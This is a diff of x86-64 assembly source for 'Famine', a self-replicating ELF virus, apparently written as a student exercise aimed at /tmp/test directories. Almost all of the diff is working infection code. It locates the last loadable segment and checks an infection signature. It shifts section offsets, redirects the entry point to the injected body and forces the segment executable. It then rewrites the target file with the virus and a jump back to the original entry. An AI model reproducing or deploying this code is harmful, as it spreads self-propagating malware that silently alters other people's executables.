@@ -148,7 +148,7 @@ open_file:
 	sub 	rsp, 20 	 	; int fd, size_t size, void *data
  	 	 	 				; [rsp] , [rsp + 4]  , [rsp + 12]
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; int	sys_open(file_path, O_RDWR, 0)                                   ;;
+	;; int	sys_open(file_path, O_RDWR|O_NONBLOCK, 0)                        ;;
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	xor 	edx, edx
 	mov 	esi, 2
@@ -247,7 +247,8 @@ pack_file:
 	ja  	pack_file_end
 	
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; Get the Program Header Table
+	;; 1. Get the Program Header Table end address
+	;;    Register RCX will contain it.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	movzx	ecx, WORD [rdx + 56] 	; ->e_phnum (size: 2)
 	mov 	r8, QWORD [rdx + 32] 	; ->e_phoff (size: 8)
@@ -255,11 +256,11 @@ pack_file:
 	imul	rcx, rcx, 56 			; total size of Program Header table (56: sizeof Elf64_Phdr)
 	add 	rcx, r8 	   			; offset to the end of Program Header table
 	add 	rcx, rdx 	 			; address of the end of Program Header table
-	xor 	r8d, r8d 	 			; Will contain the highest loadable segment
+	xor 	r8, r8					; to store the highest lodable segment address
 	jmp 	find_highest_pt
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 1. Find the highest memory mapped PT_LOAD segment.
+	;; 2. Find the highest memory mapped PT_LOAD segment.
 	;;    Register R8 will contain it.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 first_segment:
@@ -280,11 +281,11 @@ find_highest_pt:
 	jmp 	next_program
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 2. Verify if the file is already infected
+	;; 3. Verify if the file is already infected
 	;;    ^o^
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 check_signature:	
-	test	r8, r8 	 	 		; if no loadable segment has been found, return
+	test	r8, r8 	 	 			; if no loadable segment has been found, return
 	je  	pack_file_end
 	;; rdx contains *data
 	;; rsi contains size
@@ -298,41 +299,7 @@ check_signature:
 	je  	pack_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 3. Change the offset of sections higher than the section we infect.
-	;;    Infecting the last loadable segment will modify the strtab offset.
-	;;    Not doing this will not make the program crash.
-	;;    This is only relevant for debugging programs who will not find
-	;;    the main and the function of the program.
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; Get the Section Header Table (SHT)
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
-	movzx	ecx, WORD [rdx + 60]  	; ->e_shnum (size: 2)
-	mov 	r9d, DWORD [rdx + 40] 	; ->e_shoff (size: 4)
-	lea 	rax, [rdx + r9] 	 	; pointer to first segment of SHT
-	imul	rcx, rcx, 64 			; total size of SHT (64: sizeof Elf64_Shdr)
-	add 	rcx, r9 	 	 		; offset to the end of SHT
-	add 	rcx, rdx 	 			; address of the end of SHT
-	mov 	r9, QWORD [r8 + 8] 		; store the infected segment offset (+8: ->p_offset)
-	add 	r9, QWORD [r8 + 40] 	; add to it its size (+40: ->p_memsz)
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; Iterate over Sections to modify those higher than our infected segment (IS)
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
-find_higher_sections:
-	mov 	r10, QWORD [rax + 24]  	; store section offset
-	cmp 	r10, r9  	 			; compare if greater than the IS offset + size
-	jl  	next_section
-	add 	r10, [rel famine64_size] ; If it is, add to section offset our code size
-	mov 	QWORD [rax + 24], r10
-next_section:
-	add 	rax, 64 	 	 		; move to next section
-	cmp 	rcx, rax 	 			; check if we are at the end of it
-	jl  	find_higher_sections
-
-	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 4. Erase file from system tree
+	;; 4. Erase file from system tree before any changes !!!
 	;;    int unlink(char *pathname)
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	;;  rdi already contains *path
@@ -342,38 +309,87 @@ next_section:
 	jl  	pack_file_end
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 4. Make things change
-	;; 	  a. Change the program entry point
-	;;    b. Change the Section Header Table offset
-	;;    c. Change the infected Segment flags
-	;;    d. Change the infected segment memory size
+	;; 5. Make things change
+	;;   a. Change the offset of sections higher than the section we infect.
+	;;      Infecting the last loadable segment will modify the strtab offset.
+	;;      Not doing this will not make the program crash.
+	;;      This is only relevant for debugging programs who will not find
+	;;      the main and the function of the program.
+	;; 	 b. Change the program entry point
+	;;   c. Change the Section Header Table offset
+	;;   d. Change the infected Segment flags
+	;;   e. Change the infected segment memory size
 	;; 
-	;;    r8  : Segment we infect.
-	;;    rcx : Elf Header.
+	;;   r8  : Segment we infect.
+	;;   rcx : Elf Header.
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-modify_program:	
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; a-1. Get the Section Header Table (SHT)
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	xor 	rcx, rcx
+	movzx	ecx, WORD [rdx + 60]  	; ->e_shnum (size: 2)
+	mov 	r9, QWORD [rdx + 40] 	; ->e_shoff (size: 4)
+	lea 	rax, [rdx + r9] 	 	; pointer to first segment of SHT
+	imul	rcx, rcx, 64 			; total size of SHT (64: sizeof Elf64_Shdr)
+	add 	rcx, r9 	 	 		; offset to the end of SHT
+	add 	rcx, rdx 	 			; address of the end of SHT
+	mov 	r9, QWORD [r8 + 8] 		; store the infected segment offset (+8: ->p_offset)
+	add 	r9, QWORD [r8 + 40] 	; add to it its size (+40: ->p_memsz)
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; a-2. Iterate over Sections to modify those higher than our infected segment (IS)
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+find_higher_sections:
+	xor 	r10, r10
+	mov 	r10, QWORD [rax + 24]  	; store section offset
+	cmp 	r10, r9  	 			; compare if greater than the IS offset + size
+	jl  	next_section
+	add 	r10d, [rel famine64_size] ; If it is, add to section offset our code size
+	mov 	QWORD [rax + 24], r10
+next_section:
+	add 	rax, 64 	 	 		; move to next section
+	cmp 	rcx, rax 	 			; check if we are at the end of it
+	jl  	find_higher_sections
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; b. Modify Program Entry Point
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+	xor 	r9, r9
 	mov 	rax, QWORD [rdx + 24]  	; First, store the original program entry point
 	mov 	r9, QWORD [r8 + 16] 	; store infected segment virtual address (+16: ->p_vaddr)
 	add 	r9, QWORD [r8 + 40] 	; add it the segment memory size
  	 	 	 	 					; (value is virtual address of our infected code)
 	mov 	QWORD [rdx + 24], r9 	; modify the Program entry point
 
-	mov 	r10, [rel famine64_size] 	; store our program size
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; c. Modify Section Header Table offset
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+	xor 	r10, r10
+	mov 	r10d, [rel famine64_size] 	; store our program size
 	add 	QWORD [rdx + 40], r10 		; modify the Section Header table offset
 
-	mov 	ecx, DWORD [r8 + 4] 	; store infected segment flags (+4: ->p_flags)
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; d. Modify Infected Segment permissions
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+	xor 	ecx, ecx
+	mov 	ecx, DWORD [r8 + 4] 	; store infected segment permissions (+4: ->p_flags)
 	test	cl, 1 	 	 			; see if it is EXECUTABLE
-	jne 	modify_next
-	or  	ecx, 1 	 	 			; then make it so
+	jne 	modify_sht_memsize
+	or  	ecx, 1 	 	 			; if not, make it so
 	mov 	DWORD [r8 + 4], ecx
 
-modify_next:	
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; e. Modify Infected Segment memory / file size
+	;;    r10 contains famine64_size
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;	
+modify_sht_memsize:
 	add 	QWORD [r8 + 40], r10  	; change segment memory size
 	mov 	r10, QWORD [r8 + 40]
 	mov 	QWORD [r8 + 32], r10  	; change segment file size
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; 5. Rewrite the program
+	;; 6. Rewrite the program
 	;;    a. Re-open the file in write only mode
 	;;    b. Copy the original program until the infected segment offset.
 	;;    c. Copy our program at the end of it,
@@ -391,13 +407,13 @@ modify_next:
 	mov 	QWORD [rsp + 20], rax 		; store the original program entry point
 	mov 	rax, QWORD [r8 + 8] 		; store infected->p_offset
 	add 	rax, QWORD [r8 + 40] 		;     + infected->p_filesz
-	sub 	rax, [rel famine64_size]	;     - famine64_size
+	sub 	eax, [rel famine64_size]	;     - famine64_size
 	mov 	QWORD [rsp + 28], rax
 	lea 	rdi, [rdi]			  		; load file_path address
 	mov 	QWORD [rsp + 36], rdi		; store file_path addr
 	
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; int	sys_open(file_path, O_WRONLY|O_CREAT, 0755)                      ;;
+	;; a. int	sys_open(file_path, O_WRONLY|O_CREAT|O_EXCL|O_DSYNC, 0755)
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edx, 493			; 0755
 	mov 	esi, 65				; O_WRONLY|O_CREAT
@@ -409,9 +425,9 @@ modify_next:
 	mov 	DWORD [rsp], eax 	; store file fd
 
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; int	sys_write(fd, data, somesize)                                    ;;
+	;; b. int	sys_write(fd, data, IS offset)
+	;;    - Write from file[0] to file[injection] -
 	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-	;; Write from file[0] to file[injection].
 	mov 	edi, eax 		  		; file fd
 	mov 	rsi, QWORD [rsp + 4] 	; pointer of program data
 	mov 	rdx, QWORD [rsp + 28] 	; size until our injection
@@ -420,7 +436,10 @@ modify_next:
 	cmp 	rax, 0
 	jl  	clean_write_end
 
-	;; Write injection.
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; c. int	sys_write(fd, data, IS offset)
+	;;    - Write our injection -
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edi, DWORD [rsp] 	 		; file fd
 	lea 	rsi, [rel famine64_func] 	; famine64_func
 	mov 	edx, [rel famine64_size]	; famine64_size
@@ -430,7 +449,10 @@ modify_next:
 	cmp 	rax, 0
 	jl  	clean_write_end
 
-	;; Write original entry point.
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; d. int	sys_write(fd, data, IS offset)
+	;;    - Write original entry point -
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edi, DWORD [rsp] 		; file fd
 	lea 	rsi, [rsp + 20] 	 	; load the original program entry point address
 	mov 	rdx, 8 	 	 			; sizeof jump_vaddr
@@ -439,7 +461,10 @@ modify_next:
 	cmp 	rax, 0
 	jl  	clean_write_end
 
-	;; Write rest of file ( from file[injection] to file[file_size] ).
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; d. int	sys_write(fd, data, IS offset)
+	;;    - Write from file[injection] to file[file_size] -
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 	mov 	edi, DWORD [rsp] 		; file fd
 	mov 	rsi, [rsp + 4] 	 		; file first bit
 	add 	rsi, QWORD [rsp + 28]	; plus what we already wrote !
@@ -447,16 +472,22 @@ modify_next:
 	sub 	rdx, QWORD [rsp + 28]	; less what we already wrote !
 	mov 	rax, SYS_WRITE
 	syscall
+
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	;; 7. Close file
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 clean_write_end:
 	mov 	edi, DWORD [rsp]
 	mov 	rax, SYS_CLOSE
 	syscall
+
 write_end:	
 	add 	rsp, 44
 pack_file_end:
 	ret
 	
-famine64_end:	
+famine64_end:
 	add 	rsp, 8
 	pop 	rbx
 	pop 	rax
@@ -464,14 +495,18 @@ famine64_end:
 	pop 	rsi
 	pop 	rdi
 
+	cmp 	QWORD [rel jump_vaddr], 0x0
+	je  	no_jump
 	push 	QWORD [rel jump_vaddr]
+no_jump:
 	ret
+	nop
 	nop
 	nop
 	
 famine64_data:
-	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	famine64_size dd end_of_file - famine64_func
+	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx", 0
 	dir_one db "/tmp/test/", 0
 	dir_two db "/tmp/test2/", 0
 	signature dd 0x42CAFE42, 0x24EFAC24
